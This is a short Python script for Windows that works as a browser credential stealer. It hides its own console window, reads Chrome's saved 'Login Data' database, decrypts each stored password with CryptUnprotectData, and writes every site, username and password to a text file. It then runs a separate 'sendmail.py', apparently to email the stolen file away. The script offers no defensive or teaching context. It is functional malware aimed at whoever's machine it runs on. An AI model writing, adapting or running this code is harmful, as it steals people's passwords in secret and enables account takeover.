#!/usr/bin/env python
from os import getenv
import sqlite3
import win32crypt
import os

#If we want to hide the console
import win32console, win32gui
window = win32console.GetConsoleWindow()
win32gui.ShowWindow(window, 0)

#Lets Connect to the Database
conn = sqlite3.connect(getenv("APPDATA")+r"\..\Local\Google\Chrome\User Data\Default\Login Data") #Default chrome location for details
cursor = conn.cursor()
conn.execute("PRAGMA busy_timeout = 300000")   # Added PRAGMA busy_timneout to wait for some other transaction to finish
cursor.execute('Select action_url, username_value, password_value FROM logins')
fp = open(r"Chromepass.txt", "a+")

# Now we write to the file
fp.write("Chrome Saved Passwords\n")
for result in cursor.fetchall():

    password = win32crypt.CryptUnprotectData(result[2],None,None,None,0)[1]

    if password:

        fp.write('\nThe website is '+result[0])
        fp.write('\nThe Username is '+result[1])
        fp.write('\n The password is ' + str(password))


    ## lets send the file now, rune the sendmail script

os.system('python sendmail.py')
